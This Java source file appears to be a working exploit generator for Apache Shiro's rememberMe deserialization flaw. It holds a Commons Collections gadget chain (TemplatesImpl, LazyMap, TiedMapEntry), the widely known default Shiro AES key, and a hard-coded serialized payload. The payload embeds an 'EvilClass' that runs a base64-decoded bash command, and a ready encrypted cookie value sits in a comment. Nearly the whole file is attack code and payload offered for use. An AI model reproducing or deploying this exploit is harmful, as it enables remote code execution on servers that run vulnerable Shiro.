package Seri;

import com.sun.org.apache.bcel.internal.util.ClassLoader;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.annotation.Retention;
import java.lang.reflect.*;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.*;

import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import com.sun.org.apache.bcel.internal.Repository;

import org.apache.tomcat.dbcp.dbcp2.*;
import org.hibernate.transform.Transformers;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;

public class Test {
    public static void main(String[] args) throws Exception {
//        Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer("fake")};
//
//        byte[] bytes = Utils.getEvilPayload("calc");
//        TemplatesImpl templates = new TemplatesImpl();
//        Utils.setValue(templates ,"_name" ,"xxx");
//        Utils.setValue(templates ,"_class" ,null);
//        Utils.setValue(templates ,"_bytecodes" ,new byte[][]{bytes});
//        Utils.setValue(templates ,"_tfactory" ,new TransformerFactoryImpl());
//        Transformer[] ts = new Transformer[]{
//                new ConstantTransformer(TrAXFilter.class),
//                new InstantiateTransformer(
//                        new Class[]{Templates.class},
//                        new Object[]{templates})
//        };
//        ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformer);
//
//        HashMap innerMap = new HashMap();
//        Map outerMap = LazyMap.decorate(innerMap ,chainedTransformer);
//        TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap,"tmpKey");
//        HashMap hashMap = new HashMap();
//        hashMap.put(tiedMapEntry ,"xvalue");
//
//        outerMap.remove("tmpKey");
//
//        Utils.setValue(chainedTransformer ,"iTransformers" ,ts);
//
//        Utils.serialize(hashMap ,"bin/test.bin");

//        Map outerMap = TransformedMap.decorate(innerMap ,null ,chainedTransformer);
        String key = "kPH+bIxk5D2deZiIxcaaaA==";
        String payload = "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IANG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5rZXl2YWx1ZS5UaWVkTWFwRW50cnmKrdKbOcEf2wIAAkwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwc3IAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0/BbqyrMwMACUkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFoAFV91c2VTZXJ2aWNlc01lY2hhbmlzbUwAGV9hY2Nlc3NFeHRlcm5hbFN0eWxlc2hlZXR0ABJMamF2YS9sYW5nL1N0cmluZztMAAtfYXV4Q2xhc3Nlc3QAO0xjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9IYXNodGFibGU7WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AAdMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////AHQAA2FsbHB1cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAF1cgACW0Ks8xf4BghU4AIAAHhwAAABy8r+ur4AAAA0ABsBAAlFdmlsQ2xhc3MHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEADkV2aWxDbGFzcy5qYXZhAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcABwEACDxjbGluaXQ+AQADKClWAQAEQ29kZQEAEWphdmEvbGFuZy9SdW50aW1lBwAMAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwADgAPCgANABABAC1iYXNoIC1jIHtlY2hvLFkyRnNZdz09fXx7YmFzZTY0LC1kfXx7YmFzaCwtaX0IABIBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAUABUKAA0AFgEABjxpbml0PgwAGAAKCgAIABkAIQACAAgAAAAAAAIACAAJAAoAAQALAAAAFgACAAAAAAAKuAAREhO2ABdXsQAAAAAAAQAYAAoAAQALAAAAEQABAAEAAAAFKrcAGrEAAAAAAAEABQAAAAIABnB0AAN4eHhwdwEAeHNyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5JbnZva2VyVHJhbnNmb3JtZXKH6P9re3zOOAIAA1sABWlBcmdzdAATW0xqYXZhL2xhbmcvT2JqZWN0O0wAC2lNZXRob2ROYW1lcQB+AAdbAAtpUGFyYW1UeXBlc3EAfgAKeHBwdAAObmV3VHJhbnNmb3JtZXJwc3EAfgAAP0AAAAAAAAx3CAAAABAAAAAAeHh0AAh0bXBWYWx1ZXg=";
        AesCipherService aes = new AesCipherService();
        byte[] keyBytes = Base64.getDecoder().decode(key);
        System.out.println(aes.encrypt(Base64.getDecoder().decode(payload) , keyBytes).toString());
        // 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

    }

    public static void serialize(Object object ,String filename) throws IOException {
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(object);
        oos.close();

        FileOutputStream fos = new FileOutputStream(filename);
        barr.writeTo(fos);
        fos.close();

        System.out.println(barr);
    }
    public static void unserialize(String filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        ois.readObject();
        ois.close();
    }
}
